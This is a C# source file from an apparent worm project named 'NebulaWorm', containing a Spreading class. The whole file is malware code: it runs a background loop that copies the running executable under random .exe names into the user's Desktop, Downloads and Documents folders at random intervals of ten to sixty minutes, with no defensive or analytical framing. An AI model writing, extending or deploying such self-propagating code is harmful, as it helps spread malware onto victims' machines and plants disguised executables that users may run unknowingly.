using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace NebulaWorm
{
    internal static class Spreading
    {
        private static readonly string sourcePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        private static readonly Random rnd = new Random();

        private static readonly string[] targetFolders = new string[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
        };

        private static CancellationTokenSource cts;

        public static void StartSpreading()
        {
            if (cts != null) return; 
            cts = new CancellationTokenSource();

            Task.Run(async () =>
            {
                while (!cts.Token.IsCancellationRequested)
                {
                    try
                    {
                        await SpreadOnceAsync();
                    }
                    catch (Exception ex)
                    {
                        SafeConsoleWrite($"[Spreading] Error: {ex.Message}");
                    }

                 
                    int waitMs = rnd.Next(600_000, 3_600_000);
                    await Task.Delay(waitMs, cts.Token);
                }
            }, cts.Token);
        }

        public static void StopSpreading()
        {
            if (cts == null) return;
            cts.Cancel();
            cts = null;
            SafeConsoleWrite("[Spreading] Stopped.");
        }

        private static async Task SpreadOnceAsync()
        {
            foreach (var folder in targetFolders)
            {
                try
                {
                    if (!Directory.Exists(folder)) continue;

                    
                    string randomFileName = GenerateRandomFileName(8) + ".exe";
                    string destFile = Path.Combine(folder, randomFileName);

                    if (!File.Exists(destFile))
                    {
                        await Task.Run(() => File.Copy(sourcePath, destFile));
                        SafeConsoleWrite($"[Spreading] Spreaded to: {destFile}");
                    }
                }
                catch (Exception ex)
                {
                    SafeConsoleWrite($"[Spreading] Spread Error: {ex.Message}");
                }
            }
        }

        private static string GenerateRandomFileName(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            char[] buffer = new char[length];
            lock (rnd) 
            {
                for (int i = 0; i < length; i++)
                    buffer[i] = chars[rnd.Next(chars.Length)];
            }
            return new string(buffer);
        }

        private static void SafeConsoleWrite(string message)
        {
            try
            {
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.WriteLine(message);
                Console.ResetColor();
            }
            catch { }
        }
    }
}
